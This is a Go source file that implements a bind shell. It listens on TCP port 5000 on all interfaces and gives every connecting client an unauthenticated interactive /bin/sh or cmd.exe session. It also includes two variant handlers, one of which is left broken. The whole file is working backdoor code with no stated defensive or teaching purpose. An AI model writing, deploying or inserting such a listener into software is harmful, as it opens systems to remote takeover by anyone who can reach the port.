package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"syscall"
)

func main() {
	listener, err := net.Listen("tcp", ":5000")
	if err != nil {
		log.Fatalf("failed to bind 0.0.0.0:5000 error: %v", err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("well... some error on Accept occured...")
			continue
		}
		go handle_connection(conn)
	}
}

func handle(conn net.Conn) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true,
		}
	}

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp

	// needs error checking
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
	wp.Close()
}

func handle_connection2(conn net.Conn) {
	defer conn.Close()

	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-c")

	}

	scanner := bufio.NewScanner(conn)

	for scanner.Scan() {
		if scanner.Text() == "" {
			continue
		}
		fmt.Printf("Executing : %s\n", scanner.Text())
		//cmd = exec.Command("/bin/sh", "-c", scanner.Text())

		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("An error occured:", err.Error())
			out = append(out, []byte(fmt.Sprintf("\nError: %v\n", err))...)
		}

		//fmt.Println(string(out))
		conn.Write(out)

	}

	if err := scanner.Err(); err != nil {
		fmt.Println("error on connection", err.Error())
	} else {
		fmt.Println("client disconnected")
	}
}

func handle_connection(conn net.Conn) {
	defer conn.Close()

	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true,
		}

	}

	//cmd = exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Run(); err != nil {
		fmt.Println("An error occured:", err.Error())
	}

	fmt.Println("client disconnected")

}
